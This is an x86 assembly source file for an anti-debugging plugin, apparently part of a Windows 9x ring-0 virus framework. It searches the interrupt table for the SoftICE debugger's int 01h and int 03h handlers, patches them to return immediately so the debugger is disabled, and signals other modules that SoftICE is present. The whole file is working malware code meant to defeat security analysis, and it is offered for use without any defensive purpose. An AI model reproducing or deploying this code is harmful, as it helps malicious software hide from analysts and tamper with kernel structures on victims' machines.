   ; FUCKICE
   ; ~~~~~~~
   ; - soft-ice fuckup extension (works in w9x ring0)
   ; - generates EV_FUCKICE_SOFTICE_PRESENT event (yeah, to kill em' all)

   include                 INCLUDE\consts.inc
   include                 tsr.inc

   include                 plugin.inc
                           PLUGIN_START    FUCKICE, W9XR0, PERMUTABLE

   handleevent:            hookevent EV_TSR_IN0_ONSTART, fuckit
                           stc
                           retn

   fuckit:                 pusha

                           sidt    [esp-6]
                           mov     ebx, [esp-4]

                           xor     edx, edx

                           mov     eax, [ebx+01h*8+6-2]      ; int 01h
                           mov     ax,  [ebx+01h*8+0]
                           call    __fuckint

                           mov     eax, [ebx+03h*8+6-2]      ; int 03h
                           mov     ax,  [ebx+03h*8+0]
                           call    __fuckint

                           or      edx, edx
                           jz      __exit

                           event   EV_FUCKICE_SOFTICE_PRESENT

   __exit:                 popa
                           stc             ; let others use this event too
                           retn

   __fuckint:              cmp     byte ptr [eax], 68h     ; softice signature
                           jne     __skip
                           cmp     byte ptr [eax+5], 0E9h  ; -//-
                           jne     __skip
                           mov     byte ptr [eax], 0CFh    ; iret   8-( )
                           inc     edx
   __skip:                 ret

                           PLUGIN_END
